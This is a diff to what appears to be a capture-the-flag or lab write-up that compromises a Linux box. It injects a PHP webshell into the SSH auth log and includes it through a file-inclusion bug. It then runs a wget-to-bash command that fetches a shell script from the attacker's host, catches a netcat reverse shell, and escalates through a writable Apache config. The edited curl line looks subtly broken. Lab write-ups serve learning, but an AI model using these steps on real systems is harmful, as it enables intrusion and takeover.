@@ -371,18 +371,76 @@ Aug 18 11:30:26 ubuntu sshd[24632]: Connection closed by invalid user yaya 192.1
 
 Uploading a php webshell into the ssh auth log
 ```
-ssh '<?php system($_GET["cmd"]); ?>'@192.168.185.80
+ssh '<?php echo system($_GET["cmd"]); ?>'@192.168.185.80
 <?php system($_GET["cmd"]); ?>@192.168.185.80's password:
 ^C
 ```
 
 Using the webshell to trigger a staged reverse shell, this was a bit of a trial and error process as the box does not have curl, this ended up working with wget
 ```bash
-wget -O- http://192.168.45.227:9090/shell.sh|bash
+wget -O- http://192.168.45.218:9090/shell.sh|bash
 ```
 
 ```bash
-curl 'http://192.168.185.80/console/file.php?file=../../../../../var/log/auth.log&cmd=%77%67%65%74%20%2d%4f%2d%20%68%74%74%70%3a%2f%2f%31%39%32%2e%31%36%38%2e%34%35%2e%32%32%37%3a%39%30%39%30%2f%73%68%65%6c%6c%2e%73%68%7c%62%61%73%68'
+curl 'http://192.168.168.80/console/file.php?file=../../../../../var/log/auth.log?cmd=wget%20-O-%20http://192.168.45.218:9090/shell.sh%7Cbash'
+```
+
+www-data having sudoer's rules looks a bit weird to me but ok. We can restart the apache daemon.
+```bash
+sudo -l
+sudo -l
+Matching Defaults entries for www-data on ubuntu:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User www-data may run the following commands on ubuntu:
+    (ALL) NOPASSWD: /bin/systemctl start apache2
+    (ALL) NOPASSWD: /bin/systemctl stop apache2
+    (ALL) NOPASSWD: /bin/systemctl restart apache2
+```
+
+
+## Restart the server as Mahakal
+
+We also have access to modify the apache config
+```bash
+ls -la /etc/apache2/apache2.conf
+-rwxrwxrwx 1 root root 7254 Aug 20 10:36 /etc/apache2/apache2.conf
+```
+
+So let's get a proper shell
+```bash
+┌──(blnkn㉿Kolossus)-[~]
+└─$ nc -lvnp 4242
+listening on [any] 4242 ...
+connect to [192.168.45.218] from (UNKNOWN) [192.168.168.80] 54240
+bash: cannot set terminal process group (545): Inappropriate ioctl for device
+bash: no job control in this shell
+www-data@ubuntu:/var/www/html/console$ python3 -c 'import pty;pty.spawn("/bin/bash")'
+<ole$ python3 -c 'import pty;pty.spawn("/bin/bash")'
+www-data@ubuntu:/var/www/html/console$ ^Z
+[1]+  Stopped                 nc -lvnp 4242
+
+┌──(blnkn㉿Kolossus)-[~]
+└─$ stty raw -echo
+
+┌──(blnkn㉿Kolossus)-[~]
+└─$
+nc -lvnp 4242
+             reset
+reset: unknown terminal type unknown
+Terminal type? screen
+www-data@ubuntu:/var/www/html/console$ export TERM=screen
+www-data@ubuntu:/var/www/html/console$ export SHELL=bash
+www-data@ubuntu:/var/www/html/console$
+www-data@ubuntu:/var/www/html/console$
+```
+
+Now we can use vim to modify the config to run the server as mahakal and restart the daemon
+```bash
+# These need to be set in /etc/apache2/envvars
+User mahakal
+Group mahakal
 ```
 
 Makahal can run nmap as root
